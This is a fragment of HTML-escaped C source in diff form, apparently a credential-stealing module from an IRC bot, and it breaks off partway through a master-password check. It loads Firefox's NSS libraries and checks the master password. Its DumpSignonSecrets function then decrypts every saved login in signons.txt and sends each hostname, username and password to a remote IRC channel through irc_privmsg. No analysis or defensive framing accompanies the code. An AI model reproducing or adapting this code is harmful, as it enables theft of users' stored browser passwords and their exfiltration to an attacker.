+&nbsp; &nbsp;// First load the libraries from firefox path.
+<br />
+&nbsp; &nbsp;if&#40; firefoxPath != NULL &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// Load all the libraries from the leaf to the root..in the dependency list.
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; LoadLibrary2&#40;firefoxPath, NSPR_LIBRARY_NAME&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40;&#40;libplc=LoadLibrary2&#40;firefoxPath, PLC_LIBRARY_NAME&#41;&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; LoadLibrary2&#40;firefoxPath, PLDS_LIBRARY_NAME&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; LoadLibrary2&#40;firefoxPath, SOFTN_LIBRARY_NAME&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;libnss=LoadLibrary2&#40;firefoxPath, NSS_LIBRARY_NAME&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//if&#40; libnss &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//&nbsp; &nbsp;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n\n Library loaded from firefox path successfully &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;&nbsp; &nbsp;
+<br />
+
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+
+<br />
+&nbsp; &nbsp;// Now load from current path.
+<br />
+&nbsp; &nbsp;if&#40; !libnss &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Loading library from current directory&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+//&nbsp; &nbsp;&nbsp; &nbsp;libnss =LOADLIBRARY&#40;NSS_LIBRARY_NAME&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;libnss = LoadLibrary2&#40;firefoxPath, NSS_LIBRARY_NAME&#41;;
+<br />
+//&nbsp; &nbsp;&nbsp; &nbsp;libplc =LOADLIBRARY&#40;PLC_LIBRARY_NAME&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;libplc = LoadLibrary2&#40;firefoxPath, PLC_LIBRARY_NAME&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; !libnss || !libplc &#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n\n Failed to load Firefox libraries %s &amp; %s &quot;, NSS_LIBRARY_NAME, PLC_LIBRARY_NAME&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Firefox Libraries loaded successfully..&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;// Extract the required functions....
+<br />
+&nbsp; &nbsp;NSSInit&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;= &#40;NSS_Init&#41; GETPROCADDRESS&#40;libnss, &quot;NSS_Init&quot;&#41;;
+<br />
+&nbsp; &nbsp;NSSShutdown&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;= &#40;NSS_Shutdown&#41;GETPROCADDRESS&#40;libnss, &quot;NSS_Shutdown&quot;&#41;;
+<br />
+&nbsp; &nbsp;PK11GetInternalKeySlot = &#40;PK11_GetInternalKeySlot&#41; GETPROCADDRESS&#40;libnss, &quot;PK11_GetInternalKeySlot&quot;&#41;;
+<br />
+&nbsp; &nbsp;PK11FreeSlot&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= &#40;PK11_FreeSlot&#41; GETPROCADDRESS&#40;libnss, &quot;PK11_FreeSlot&quot;&#41;;
+<br />
+&nbsp; &nbsp;PK11Authenticate&nbsp; &nbsp; &nbsp; &nbsp;= &#40;PK11_Authenticate&#41; GETPROCADDRESS&#40;libnss, &quot;PK11_Authenticate&quot;&#41;;
+<br />
+&nbsp; &nbsp;PK11SDRDecrypt&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;= &#40;PK11SDR_Decrypt&#41; GETPROCADDRESS&#40;libnss, &quot;PK11SDR_Decrypt&quot;&#41;;
+<br />
+&nbsp; &nbsp;PK11CheckUserPassword&nbsp; = &#40;PK11_CheckUserPassword &#41; GETPROCADDRESS&#40;libnss, &quot;PK11_CheckUserPassword&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n\n Failed to get function address from library %s &quot;, NSS_LIBRARY_NAME&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;TerminateFirefoxLibrary&#40;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// Get the functions from PLC library
+<br />
+&nbsp; &nbsp;PLBase64Decode&nbsp; &nbsp; &nbsp;= &#40; PL_Base64Decode &#41; GETPROCADDRESS&#40;libplc, &quot;PL_Base64Decode&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; !PLBase64Decode &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n\n Failed to get function address from library %s &quot;, PLC_LIBRARY_NAME&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;TerminateFirefoxLibrary&#40;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Firefox library initialized successfully..&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+int InitializeNSSLibrary&#40;char *profilePath, char *password&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;IsNSSInitialized = 0;
+<br />
+
+<br />
+&nbsp; &nbsp;// Initialize the NSS library
+<br />
+&nbsp; &nbsp;if&#40; &#40;*NSSInit&#41; &#40;profilePath&#41; != SECSuccess &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n\n Initialization failed , Make sure key3.db and cert8.db&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n files are present in the specified directory\n&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;TerminateFirefoxLibrary&#40;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;IsNSSInitialized = 1;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; &#40;password != NULL&#41; &amp;&amp; &#40;strlen&#40;password&#41; &gt; 1023&#41; &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n\n Master Password length is more than the allowed size&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;TerminateFirefoxLibrary&#40;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// Setup and check if master password is correct
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; &#40;password == NULL&#41; || strlen&#40;password&#41; &lt;= 0&#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;masterPassword&#91;0&#93;=0;
+<br />
+&nbsp; &nbsp;else
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;strcpy&#40;masterPassword, password&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if&#40; CheckMasterPassword&#40; masterPassword &#41; != 1&#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;TerminateFirefoxLibrary&#40;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n NSS library initiliazed successfully&quot;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;return 1;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+void DumpSignonSecrets&#40;char *profilePath, SOCKET sock, char *dest, BOOL notice&#41;
+<br />
+&#123;
+<br />
+&nbsp; &nbsp;char _buf&#91;256&#93;;
+<br />
+char buffer&#91;10240&#93;;
+<br />
+char name&#91;10240&#93;;
+<br />
+
+<br />
+char *clearData = NULL;
+<br />
+char *signonFilePath = NULL;
+<br />
+char signonFileName1&#91;&#93;=&quot;/signons.txt&quot;;
+<br />
+char signonFileName2&#91;&#93;=&quot;/signons2.txt&quot;;
+<br />
+
+<br />
+
+<br />
+int bufferLength = 10240;
+<br />
+int count = 0;
+<br />
+int ret;
+<br />
+int version=1;
+<br />
+
+<br />
+&nbsp; &nbsp;signonFilePath = &#40;char*&#41; malloc&#40; strlen&#40;profilePath&#41; + 64 + 1 &#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; signonFilePath == NULL &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Insufficient memory ....&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;strcpy&#40;signonFilePath, profilePath&#41;;
+<br />
+&nbsp; &nbsp;strcat&#40;signonFilePath, signonFileName1&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Final signon filename is&nbsp; = %s &quot;, signonFilePath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// Open the signon file 
+<br />
+&nbsp; &nbsp;if&#40; OpenFile2&#40;signonFilePath&#41; == 0 &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;strcpy&#40;signonFilePath, profilePath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;signonFilePath, signonFileName2&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n Final signon filename is&nbsp; = %s &quot;, signonFilePath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; OpenFile2&#40;signonFilePath&#41; == 0 &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR,&quot;\n Failed to open the Firefox signon file.\n Unless you use Firefox password manager to save your passwords, signon file will not be present.\n&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;version = 2;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+
+<br />
+&nbsp; &nbsp;// read the header format information 
+<br />
+&nbsp; &nbsp;if&#40; ReadLine&#40;buffer, bufferLength&#41; == 0 &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Error in reading signon file header &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// check if the format is right...
+<br />
+&nbsp; &nbsp;if&#40; &#40;&#40;version == 1&#41; &amp;&amp; strcmp&#40;buffer, HEADER_VERSION1&#41; != 0&#41; || &#40;&#40;version == 2&#41; &amp;&amp; strcmp&#40;buffer, HEADER_VERSION2&#41; != 0&#41; &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Signon file header version information is not proper&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;//we dont need these so comment it out
+<br />
+&nbsp; &nbsp;//--&gt;DisplayMesg&#40;TYPE_PRINT, &quot;\n ****** Reject Host List *******\n&quot;&#41;; 
+<br />
+
+<br />
+&nbsp; &nbsp; // read the reject list 
+<br />
+&nbsp; &nbsp;while &#40; ReadLine&#40;buffer, bufferLength&#41; != 0 &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp; &nbsp; &nbsp;// Check for end of reject list
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if &#40;strlen&#40;buffer&#41; != 0 &amp;&amp; buffer&#91;0&#93; == '.'&#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;count++;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//--&gt;DisplayMesg&#40;TYPE_PRINT, &quot;\n %d =&gt; %s &quot;, count, buffer&#41;;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;//--&gt;DisplayMesg&#40;TYPE_PRINT, &quot;\n\n\n\n ******** Host list with username/password ******** &quot;&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;// read the URL line 
+<br />
+&nbsp; &nbsp;while &#40;ReadLine&#40;buffer, bufferLength&#41; != 0 &#41; 
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;sprintf&#40;_buf, &quot;%s &quot;, buffer&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//strcpy&#40;_buf, buffer&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n\n Host &#58; %s &quot;, buffer&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;int getSubdomain=0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// prepare to read the name/value pairs 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;while&#40; ReadLine&#40;buffer, bufferLength&#41; != 0 &#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;// line starting with . terminates the pairs for this URL entry 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if &#40;buffer&#91;0&#93; == '.'&#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n -------------------------------------------------- &quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break; // end of URL entry 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; &#40;version == 2&#41; &amp;&amp; &#40;getSubdomain == 2&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;_buf, buffer&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n %s&nbsp; &#58; %s &quot;, &quot;Subdomain&quot;, buffer&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;getSubdomain = 0;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;continue;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;// save the name part and check if it is a password 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if &#40;buffer&#91;0&#93; == '*'&#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcpy&#40;name,&amp;buffer&#91;1&#93;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ret = ReadLine&#40;buffer, bufferLength&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcpy&#40;name, buffer&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;ret = ReadLine&#40;buffer, bufferLength&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &#125;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;// read in and save the value part
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if &#40; ret == 0 &#41; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;// error in input file so give up 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Error occured while reading VALUE for &#58; %s &quot;, name&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;break;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;if&#40; DecryptSecretString&#40;buffer, &amp;clearData&#41; == 1 &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;_buf, name&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;_buf, &quot;&#58;&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;strcat&#40;_buf, clearData&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;irc_privmsg&#40;sock, dest, _buf, notice&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;_buf&#91;0&#93; = '\0';
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;Sleep&#40;FLOOD_DELAY&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//_buf = NULL;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n %s&nbsp; &#58; %s &quot;, name, clearData&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;clearData = NULL;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;else 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;getSubdomain++;
+<br />
+
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n\n **************************************************\n\n&quot;&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&#125;
+<br />
+
+<br />
+void TerminateFirefoxLibrary&#40;&#41;
+<br />
+&#123;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; IsNSSInitialized&nbsp; &amp;&amp; &#40;NSSShutdown != NULL&#41; &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#40;*NSSShutdown&#41;&#40;&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; libnss != NULL &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;FREELIBRARY&#40;libnss&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; libplc != NULL &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;FREELIBRARY&#40;libplc&#41;;
+<br />
+
+<br />
+&#125;
+<br />
+
+<br />
+HMODULE LoadLibrary2&#40;char *firefoxDir, char *libName&#41;
+<br />
+&#123;
+<br />
+char loadPath&#91;4096&#93;=&quot;&quot;;
+<br />
+
+<br />
+&nbsp; &nbsp;strcpy&#40;loadPath, firefoxDir&#41;;
+<br />
+&nbsp; &nbsp;strcat&#40;loadPath, &quot;/&quot;&#41;;
+<br />
+&nbsp; &nbsp;strcat&#40;loadPath, libName&#41;;
+<br />
+
+<br />
+//&nbsp; &nbsp;libtmp = LOADLIBRARY&#40;loadPath&#41;;
+<br />
+&nbsp; &nbsp;libtmp = LoadLibrary&#40;loadPath&#41;;
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; !libtmp &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n\n Failed to load library %s &quot;, loadPath&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;return libtmp;
+<br />
+&#125;
+<br />
+
+<br />
+/*
+<br />
+*&nbsp; &nbsp;Verifies if the specified master password is correct.
+<br />
+*&nbsp; &nbsp;return 1&nbsp; success
+<br />
+*&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0&nbsp; failure
+<br />
+*/
+<br />
+int CheckMasterPassword&#40;char *password&#41;
+<br />
+&#123;
+<br />
+
+<br />
+PK11SlotInfo *slot = 0;
+<br />
+int ret = 0;
+<br />
+
+<br />
+&nbsp; &nbsp;slot = &#40;*PK11GetInternalKeySlot&#41;&#40;&#41;;
+<br />
+&nbsp; &nbsp;
+<br />
+&nbsp; &nbsp;if &#40;!slot&#41; 
+<br />
+&nbsp; &nbsp;&#123; 
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n PK11_GetInternalKeySlot failed&nbsp; ...&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;return 0;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+&nbsp; &nbsp;// First check if the master password set
+<br />
+&nbsp; &nbsp;if&#40; password&#91;0&#93; != 0 &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; &#40;*PK11CheckUserPassword&#41;&#40;slot, &quot;&quot;&#41; == SECSuccess &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_PRINT, &quot;\n Info &#58; Master Password is NOT set. \n\n&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&#40;*PK11FreeSlot&#41; &#40;slot&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;return 1;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+
+<br />
+
+<br />
+&nbsp; &nbsp;if&#40; &#40;*PK11CheckUserPassword&#41;&#40;slot, password&#41; == SECSuccess &#41;
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;// Store the password for internal use...
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_DEBUG, &quot;\n CheckMasterPassword &#58; specified master password is correct...&quot;&#41;;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;ret = 1;
+<br />
+&nbsp; &nbsp;&#125;
+<br />
+&nbsp; &nbsp;else
+<br />
+&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;if&#40; password&#91;0&#93; == 0 &#41;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&#123;
+<br />
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;//DisplayMesg&#40;TYPE_ERROR, &quot;\n Error &#58;&nbsp; Specify the right master password and try again.&quot;&#41;;
+<br />
